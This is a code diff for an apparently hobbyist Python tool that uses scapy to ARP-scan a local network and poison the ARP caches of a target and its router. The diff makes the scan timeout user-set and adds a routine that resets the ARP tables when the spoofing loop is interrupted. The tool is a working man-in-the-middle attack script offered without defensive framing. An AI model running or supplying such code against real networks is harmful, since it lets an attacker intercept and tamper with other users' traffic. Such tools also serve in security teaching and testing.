@@ -26,7 +26,8 @@ def scan(router_ip):
     arp_request = scapy.ARP(pdst=ip_scan_range)
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
     arp_request_broadcast = broadcast/arp_request
-    scan_result_list = scapy.srp(arp_request_broadcast,verbose=False,timeout=1)[0]
+    scan_duration = int(input("[+] Please specify the desired scan duration (in seconds): "))
+    scan_result_list = scapy.srp(arp_request_broadcast,verbose=False,timeout=scan_duration)[0]
     return(scan_result_list)
 
 def format_output(scan_result_list):
@@ -88,7 +89,14 @@ def send_packets(target_packet,router_packet):
             print("\r[+] Total packets sent: " + str(total_packets_sent),end="")
             time.sleep(2)
     except KeyboardInterrupt:
-        print("\r[+] Exiting programme.")
+        return()
+
+def reset_arp_tables(target_reset_packet,router_reset_packet):
+    print("\n[+] Resetting ARP tables.")
+    for count in range(5):
+        scapy.send(target_reset_packet,verbose=False)
+        scapy.send(router_reset_packet,verbose=False)
+    return()
 
 def main():
     interface = get_input()
@@ -106,5 +114,7 @@ def main():
     target_reset_packet = packet_list[2]["packet"]
     router_reset_packet = packet_list[3]["packet"]
     send_packets(target_packet,router_packet)
+    reset_arp_tables(target_reset_packet,router_reset_packet)
+    print("[+] Programme terminated successfully.")
 
 main()
